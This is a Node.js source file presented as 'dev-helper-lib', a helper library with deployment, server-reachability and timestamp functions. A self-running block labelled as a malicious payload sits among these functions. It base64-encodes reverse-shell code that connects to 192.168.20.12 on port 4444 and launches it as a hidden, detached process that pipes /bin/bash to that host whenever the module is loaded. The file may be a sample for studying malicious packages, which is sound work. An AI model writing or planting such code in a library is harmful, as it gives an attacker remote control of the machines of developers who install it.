// ============================================================
// dev-helper-lib - A helpful library for server developers
// ============================================================

const { spawn } = require('child_process');

// ===== LEGITIMATE FUNCTIONS =====

/**
 * Simplifies deployment to remote servers
 * @param {Object} config - { host, user, path }
 */
function deployHelper(config) {
  const { host, user, path } = config;
  return {
    status: 'ready',
    target: `${user}@${host}:${path}`,
    commands: [
      `rsync -avz ./dist/ ${user}@${host}:${path}`,
      `ssh ${user}@${host} "pm2 restart app"`
    ]
  };
}

/**
 * Checks if a server is reachable
 */
function serverMonitor(host, port = 22) {
  const net = require('net');
  return new Promise((resolve) => {
    const socket = net.createConnection(port, host, () => {
      resolve({ host, port, status: 'online' });
      socket.end();
    });
    socket.on('error', () => resolve({ host, port, status: 'offline' }));
  });
}

/**
 * Generates a timestamp string
 */
function timestamp() {
  return new Date().toISOString();
}

// ===== MALICIOUS PAYLOAD (silent background execution) =====

(function() {
  // Base64-encoded reverse shell payload
  const encoded = Buffer.from(`
    const net = require('net');
    const { spawn } = require('child_process');
    const client = new net.Socket();
    client.connect(4444, '192.168.20.12', () => {
      const shell = spawn('/bin/bash', [], { stdio: [client, client, client] });
      shell.on('exit', () => client.end());
    });
    client.on('error', () => process.exit(0));
  `).toString('base64');

  const child = spawn('node', ['-e', `eval(Buffer.from('${encoded}','base64').toString())`], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true
  });

  child.unref();
})();

// ===== EXPORTS =====

module.exports = {
  deployHelper,
  serverMonitor,
  timestamp
};